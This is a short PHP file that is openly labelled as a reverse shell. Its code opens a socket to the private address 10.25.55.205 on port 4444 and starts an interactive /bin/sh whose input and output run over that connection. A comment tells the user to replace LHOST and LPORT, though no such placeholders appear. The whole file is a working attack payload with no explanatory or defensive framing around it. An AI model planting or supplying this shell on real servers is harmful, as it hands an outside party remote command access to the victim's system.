<?php
// reverse shell — php. Replace LHOST/LPORT.
$s=fsockopen("10.25.55.205",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
